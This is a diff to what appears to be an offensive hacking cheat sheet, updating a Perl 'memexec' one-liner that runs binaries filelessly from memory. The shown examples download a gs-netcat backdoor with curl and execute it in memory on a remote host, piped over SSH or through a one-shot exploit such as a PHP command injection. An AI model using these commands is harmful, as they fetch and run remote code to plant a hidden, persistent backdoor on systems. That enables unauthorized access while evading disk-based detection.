@@ -2277,7 +2277,7 @@ exec {"/proc/$$/fd/$f"} '"${strargv0}"'@ARGV or die "exec: $!";' -- "$@"
 
 The shortest possible variant is (example):
 ```shell
-memexec(){ perl '-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- "$@";}
+memexec(){ perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- "$@";}
 # Example: cat /usr/bin/id | memexec -u
 ```
 (Thank you [tmp.Out](https://tmpout.sh/) for some educated discussions and [previous work](https://captain-woof.medium.com/how-to-execute-an-elf-in-memory-living-off-the-land-c7e67dbc3100) by others)
@@ -2289,13 +2289,13 @@ GS_ARGS="-ilqD -s SecretChangeMe31337" memexec <(curl -SsfL https://gsocket.io/b
 
 The backdoor can also be piped via SSH directly into the remote's memory, and executed:
 ```sh
-MX='-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV'
+MX='-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255'
 curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-x86_64 | ssh root@foobar "exec perl '$MX' -- -ilqD -s SecretChangeMe31337"
 ```
 
 If you have a single-shot at remote executing a command (like via a PHP exploit) then this is your line:
 ```sh
-curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-efor(319,279,385,4314,4354){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV' -- -ilqD -s SecretChangeMe31337
+curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-$(uname -m)|perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}X,@ARGV;exit 255' -- -ilqD -s SecretChangeMe31337
 ```
 
 ---
